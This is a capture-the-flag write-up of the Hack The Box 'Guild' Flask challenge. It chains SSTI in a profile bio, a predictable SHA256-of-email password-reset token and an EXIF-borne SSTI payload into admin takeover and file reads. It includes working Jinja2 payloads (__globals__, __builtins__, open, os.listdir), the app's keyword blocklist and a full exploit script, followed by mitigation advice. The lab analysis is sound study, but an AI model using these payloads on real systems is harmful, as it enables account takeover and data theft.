# Guild - CTF Write-Up

| Field | Details |
|-------|---------|
| **Challenge** | Guild |
| **Category** | Web Exploitation |
| **Difficulty** | Easy (975 Points) |
| **Platform** | Hack The Box |
| **Author** | L27Sen |
| **Date** | January 5, 2026 |

---

## Challenge Description

> Welcome to the Guild! But please wait until our Guild Master verify you. Thanks for the wait.

**Provided Resources:**
- Docker instance: `94.237.56.175:48466`
- Source code files (Dockerfile, Python Flask application)

**Application Structure:**
```
guild/
├── main.py
├── requirements.txt
├── flag.txt
└── website/
    ├── __init__.py
    ├── auth.py
    ├── models.py
    ├── views.py
    ├── static/
    ├── templates/
    │   ├── newtemplate/
    │   │   └── shareprofile.html
    │   └── ...
    └── uploads/
```

---

## Goal / Objective

The objective is to exploit vulnerabilities in the Flask web application to read the flag file located on the server. The flag follows the format `HTB{...}`.

---

## Initial Analysis & Reconnaissance

### Technology Stack Identification

Upon examining the source code, I identified the following:

- **Framework:** Flask (Python)
- **Database:** SQLite with SQLAlchemy ORM
- **Authentication:** Flask-Login
- **Template Engine:** Jinja2

### Application Flow Analysis

The application implements a "Guild" membership system with the following features:

1. **User Registration/Login** (`auth.py`)
2. **Verification System** - Users must upload an ID document for admin approval
3. **Profile Management** - Users can update their bio
4. **Profile Sharing** - Public profile pages accessible via `/user/<username>`
5. **Admin Panel** - Admin can verify users by checking their uploaded documents
6. **Password Reset** - Forgot password functionality

### Key Observations from `__init__.py`

```python
# Admin user creation with random credentials
if not User.query.filter_by(username="admin").first():
    admin_user = User(
        email=str(create_random_string(8).encode("utf-8").hex()) + "@master.guild",
        username="admin",
        password=generate_password_hash(create_random_string(8).encode("utf-8").hex())
    )
```

The admin account has a randomly generated email (`<random>@master.guild`) and password.

---

## Attack Surface Identification

After thorough code review, I identified multiple potential attack vectors:

### 1. Server-Side Template Injection (SSTI) - Profile Bio

In `views.py`, the `/user/<link>` route:

```python
@views.route("/user/<link>")
def share(link):
    query = Validlinks.query.filter_by(validlink=link).first()
    if query:
        email = query.email
        query1 = User.query.filter_by(email=email).first()
        bio = Verification.query.filter_by(user_id=query1.id).first().bio
        temp = open("/app/website/templates/newtemplate/shareprofile.html", "r").read()
        return render_template_string(temp % bio, User=User, Email=email, username=query1.username)
```

The `bio` field is inserted via Python's `%` string formatting, then passed to `render_template_string()`. This is a classic SSTI vulnerability.

**However**, there's a filter function `checkInput()`:

```python
def checkInput(bio):
    payloads = [
        "*", "script", "alert", "debug", "%", "include", "html", "if", "for",
        "config", "img", "src", ".py", "main", "herf", "pre", "class", "subclass",
        "base", "mro", "__", "[", "]", "def", "return", "self", "os", "popen",
        "init", "globals", "base", "class", "request", "attr", "args", "eval",
        "newInstance", "getEngineByName", "getClass", "join"
    ]
    for x in payloads:
        if x in bio:
            return True
    return False
```

This blocks most common SSTI payloads.

### 2. SSTI via EXIF Data - Admin Verification (Unfiltered!)

In the `/verify` route (admin-only):

```python
@views.route("/verify", methods=["GET", "POST"])
@login_required
def verify():
    if current_user.username == "admin":
        # ... snip ...
        img = Image.open(query.doc)
        exif_table = {}
        for k, v in img.getexif().items():
            tag = TAGS.get(k)
            exif_table[tag] = v

        if "Artist" in exif_table.keys():
            sec_code = exif_table["Artist"]
            query.verified = 1
            db.session.commit()
            return render_template_string("Verified! {}".format(sec_code))  # <-- SSTI!
```

The `Artist` EXIF tag from uploaded images is rendered via `render_template_string()` with **NO FILTER**!

### 3. Predictable Password Reset Links

In `views.py`:

```python
@views.route("/forgetpassword", methods=["GET", "POST"])
def forgetpassword():
    if request.method == "POST":
        email = request.form.get("email")
        query = User.query.filter_by(email=email).first()
        if query:
            reset_url = str(hashlib.sha256(email.encode()).hexdigest())
            new_query = Validlinks(email=email, validlink=reset_url)
            db.session.add(new_query)
            db.session.commit()
```

The password reset link is simply `SHA256(email)` - completely predictable if we know the email!

### 4. Information Disclosure via First SSTI

Even though the bio SSTI is filtered, we can still extract information using payloads that don't contain blocked keywords, such as querying the `User` model.

---

## Deep Technical Analysis

### Attack Chain Strategy

After analyzing all attack surfaces, I devised a multi-stage attack:

```
┌─────────────────────────────────────────────────────────────────┐
│  1. Use filtered SSTI to leak admin email                       │
│                           ↓                                     │
│  2. Calculate predictable password reset hash                   │
│                           ↓                                     │
│  3. Reset admin password & login as admin                       │
│                           ↓                                     │
│  4. Create user with SSTI payload in image EXIF                 │
│                           ↓                                     │
│  5. As admin, verify that user → triggers unfiltered SSTI       │
│                           ↓                                     │
│  6. Read flag via open('/app/flag.txt').read()                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Exploitation Journey

### Phase 1: Initial SSTI Testing (Bio Field)

I first attempted to exploit the bio field SSTI directly.

**Test 1: Basic SSTI Confirmation**

```python
payload = "{{ 7+7 }}"
```

The payload was accepted, and accessing the share link returned `14` - confirming SSTI works!

```
[8] Updating bio with SSTI payload...
    Status: 200
    ✓ Bio updated with SSTI payload
    Share link status: 200
    SSTI result: '14'
    ✓✓✓ SSTI WORKS!
```

**Test 2: Attempting Filter Bypass**

I tried various filter bypass techniques:

```python
# Attempt 1: Hex encoding
"{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}"

# Attempt 2: String concatenation
"{{ 'at' ~ 'tr' }}"  # Result: "attr" - concatenation works!

# Attempt 3: Using |attr with concatenated strings
"{{ lipsum|attr('_'~'_'~'globals'~'_'~'_') }}"
```

**Results:**
- String concatenation works: `'at' ~ 'tr'` produces `attr`
- However, the filter checks the bio string **before** Jinja2 processing
- Keywords like `globals` are detected even in split form

```
Step 4: Building full chain with attr and getitem
✗ Test attr with concat string: BLOCKED
```

### Phase 2: Information Extraction via User Model

Since the `User` model is passed to the template and isn't filtered, I used it to extract sensitive data:

```python
# Get admin email
payload = "{{ User.query.first().email }}"
# Result: 436f564379615548@master.guild

# Get admin password hash
payload = "{{ User.query.first().password }}"
# Result: scrypt:32768:8:1$DXB1Ccg3EXpBrUEQ$75c862d33...
```

**Output:**
```
Test 2: Try to get admin credentials
✓ OK: Admin password hash -> scrypt:32768:8:1$DXB1Ccg3EXpBrUEQ$75c862d33e566a65...
✓ OK: Admin email -> 436f564379615548@master.guild
```

This is a critical information leak! I now have the admin's email address.

### Phase 3: Admin Account Takeover via Password Reset

With the admin email, I calculated the predictable reset link:

```python
import hashlib

admin_email = "436f564379615548@master.guild"
reset_hash = hashlib.sha256(admin_email.encode()).hexdigest()
# Result: 0d7b86310aafe42a6cb4029ee72fa6398149fe58ca318edc4fea528bed5d12d8
```

**Exploitation Steps:**

```python
# Step 1: Request password reset
session.post(f"{BASE_URL}/forgetpassword", data={'email': admin_email})

# Step 2: Access predictable reset link
reset_url = f"{BASE_URL}/changepasswd/{reset_hash}"
session.get(reset_url)  # Status: 200 ✓

# Step 3: Set new password
session.post(reset_url, data={'password': 'pwned123'})  # ✓ Password reset successful!

# Step 4: Login as admin
session.post(f"{BASE_URL}/login", data={'username': 'admin', 'password': 'pwned123'})
# ✓ Logged in as admin!
```

**Output:**
```
[4] Accessing reset link...
    URL: http://94.237.56.175:48466/changepasswd/0d7b86310aafe42a6cb4029ee72fa6398149fe58ca318edc4fea528bed5d12d8
    Status: 200
    ✓ Reset page accessible!

[5] Resetting admin password...
    Status: 200
    ✓ Password reset successful!

[6] Logging in as admin...
    Status: 200
    ✓ Logged in as admin!
```

### Phase 4: Exploiting Unfiltered SSTI via EXIF

Now as admin, I can verify users. The `Artist` EXIF tag is rendered without filtering!

**Creating Malicious Image:**

```python
from PIL import Image

# Create image with SSTI payload in Artist EXIF tag
ssti_payload = "{{ lipsum.__globals__['__builtins__']['open']('/app/flag.txt').read() }}"

img = Image.new('RGB', (100, 100), color='red')
exif = img.getexif()
exif[315] = ssti_payload  # Tag 315 = Artist

img.save('badge.jpg', format='JPEG', exif=exif)
```

**Testing Payloads Incrementally:**

I tested payloads from simple to complex to ensure they work:

| Payload | Status | Response |
|---------|--------|----------|
| `{{ 7+7 }}` | ✓ 200 | `Verified! 14` |
| `{{ 'hello' }}` | ✓ 200 | `Verified! hello` |
| `{{ config }}` | ✓ 200 | `Verified! <Config {...}>` |
| `{{ lipsum.__globals__ }}` | ✓ 200 | `Verified! {'__name__': 'jinja2.utils'...}` |
| `{{ lipsum.__globals__['__builtins__']['open'] }}` | ✓ 200 | `Verified! <built-in function open>` |

**Output:**
```
[*] Testing: Open function
    Payload: {{ lipsum.__globals__['__builtins__']['open'] }}
    Saved Artist: {{ lipsum.__globals__['__builtins__']['open'] }}...
    Status: 200
    Response: Verified! <built-in function open>
```

### Phase 5: Finding the Flag Location

My initial attempt to read `/app/guild/flag.txt` failed with a 500 error. I used the SSTI to enumerate the filesystem:

```python
# List /app directory
payload = "{{ lipsum.__globals__['__builtins__']['__import__']('os').listdir('/app') }}"
# Result: ['website', 'instance', 'guild', 'flag.txt', 'requirements.txt', 'main.py']
```

The flag is at `/app/flag.txt`, not `/app/guild/flag.txt`!

**Output:**
```
[*] Testing file paths...
Current directory: Verified! /app
/app contents: Verified! ['website', 'instance', 'guild', 'flag.txt', 'requirements.txt', 'main.py']
```

---

## Exploit Implementation

### Final Exploit Script

```python
#!/usr/bin/env python3
import requests
import hashlib
from PIL import Image
import io
import re

BASE_URL = "http://94.237.56.175:48466"

# ============================================================
# PHASE 1: Extract Admin Email via Filtered SSTI
# ============================================================
session1 = requests.Session()
session1.post(f"{BASE_URL}/signup", data={
    'email': 'recon@test.com', 
    'username': 'recon_user', 
    'password': 'pass'
})
session1.post(f"{BASE_URL}/login", data={
    'username': 'recon_user', 
    'password': 'pass'
})

# Upload verification doc
img = Image.new('RGB', (100, 100))
buf = io.BytesIO()
img.save(buf, 'JPEG')
buf.seek(0)
session1.post(f"{BASE_URL}/verification", files={'file': ('b.jpg', buf, 'image/jpeg')})

# Extract admin email via User model
session1.post(f"{BASE_URL}/profile", data={'bio': '{{ User.query.first().email }}'})
session1.get(f"{BASE_URL}/getlink")
r = session1.get(f"{BASE_URL}/user/recon_user")
admin_email = re.search(r'para-class">(.*?)</p>', r.text).group(1)
print(f"[+] Admin email: {admin_email}")

# ============================================================
# PHASE 2: Reset Admin Password
# ============================================================
reset_hash = hashlib.sha256(admin_email.encode()).hexdigest()
admin_session = requests.Session()
admin_session.post(f"{BASE_URL}/forgetpassword", data={'email': admin_email})
admin_session.post(f"{BASE_URL}/changepasswd/{reset_hash}", data={'password': 'pwned123'})
admin_session.post(f"{BASE_URL}/login", data={'username': 'admin', 'password': 'pwned123'})
print("[+] Logged in as admin!")

# ============================================================
# PHASE 3: Create Exploit User with EXIF SSTI Payload
# ============================================================
exploit_session = requests.Session()
exploit_session.post(f"{BASE_URL}/signup", data={
    'email': 'exploit@test.com', 
    'username': 'exploit_user', 
    'password': 'pass'
})
exploit_session.post(f"{BASE_URL}/login", data={
    'username': 'exploit_user', 
    'password': 'pass'
})

# Create image with SSTI payload in Artist EXIF
ssti_payload = "{{ lipsum.__globals__['__builtins__']['open']('/app/flag.txt').read() }}"
img = Image.new('RGB', (100, 100))
exif = img.getexif()
exif[315] = ssti_payload  # Artist tag
buf = io.BytesIO()
img.save(buf, 'JPEG', exif=exif)
buf.seek(0)
exploit_session.post(f"{BASE_URL}/verification", files={'file': ('b.jpg', buf, 'image/jpeg')})
print("[+] Uploaded malicious image with SSTI payload")

# ============================================================
# PHASE 4: Admin Verifies User → Triggers SSTI → Flag!
# ============================================================
r = admin_session.get(f"{BASE_URL}/admin")
verif_ids = re.findall(r'name="verification_id"\s+value="(\d+)"', r.text)
user_ids = re.findall(r'name="user_id"\s+value="(\d+)"', r.text)

r = admin_session.post(f"{BASE_URL}/verify", data={
    'user_id': user_ids[-1],
    'verification_id': verif_ids[-1]
})

flag = re.search(r'HTB\{[^}]+\}', r.text)
print(f"\n{'='*60}")
print(f"FLAG: {flag.group()}")
print(f"{'='*60}")
```

---

## Flag Retrieval

```
[+] Logged in as admin

[*] Testing file paths...
Current directory: Verified! /app
/app contents: Verified! ['website', 'instance', 'guild', 'flag.txt', 'requirements.txt', 'main.py']

✓ Path '/app/flag.txt' works!
Content: Verified! HTB{mult1pl3_lo0p5_mult1pl3_h0les_ab3548b7e63af683d7c82b4b457fd811}

============================================================
FLAG: HTB{mult1pl3_lo0p5_mult1pl3_h0les_ab3548b7e63af683d7c82b4b457fd811}
============================================================
```

**Flag:** `HTB{mult1pl3_lo0p5_mult1pl3_h0les_ab3548b7e63af683d7c82b4b457fd811}`

---

## Vulnerability Summary

| Vulnerability | Location | Severity | Impact |
|--------------|----------|----------|--------|
| **SSTI (Filtered)** | `/user/<link>` - bio field | Medium | Information Disclosure |
| **SSTI (Unfiltered)** | `/verify` - EXIF Artist tag | Critical | Remote Code Execution |
| **Predictable Password Reset** | `/forgetpassword` | High | Account Takeover |
| **Information Disclosure** | User model in template context | Medium | Admin Email Leak |

---

## Mitigation / Lessons Learned

### For Developers

1. **Never use `render_template_string()` with user-controlled input**
   - Use `render_template()` with proper escaping instead
   - If dynamic content is needed, use Jinja2's `|e` (escape) filter

2. **Implement cryptographically secure password reset tokens**
   ```python
   # Bad: Predictable
   reset_url = hashlib.sha256(email.encode()).hexdigest()
   
   # Good: Random token
   import secrets
   reset_token = secrets.token_urlsafe(32)
   ```

3. **Sanitize EXIF data before processing**
   - Never trust metadata from user-uploaded files
   - Strip or sanitize all EXIF data

4. **Don't expose ORM models directly to templates**
   - Pass only necessary data, not entire model objects
   - This prevents information leakage via template queries

### Security Best Practices

- Input validation should happen at every layer, not just the frontend
- Defense in depth: Even if one protection fails, others should catch the attack
- Regular security code reviews focusing on dangerous functions like `render_template_string()`

---

## Conclusion

This challenge demonstrated a sophisticated multi-stage attack chain exploiting multiple vulnerabilities:

1. **Filtered SSTI** was bypassed by using the exposed `User` model to extract the admin email
2. **Predictable password reset** tokens (SHA256 of email) enabled admin account takeover
3. **Unfiltered SSTI** in the admin verification flow allowed arbitrary code execution via EXIF metadata

The flag name `mult1pl3_lo0p5_mult1pl3_h0les` aptly describes the nature of this challenge - multiple security holes chained together to achieve full compromise.

**Key Takeaway:** A blacklist-based filter is never sufficient protection against SSTI. The presence of a second, unfiltered SSTI sink in a privileged context (admin verification) made the application trivially exploitable once admin access was obtained.

---

*Write-up by L27Sen*
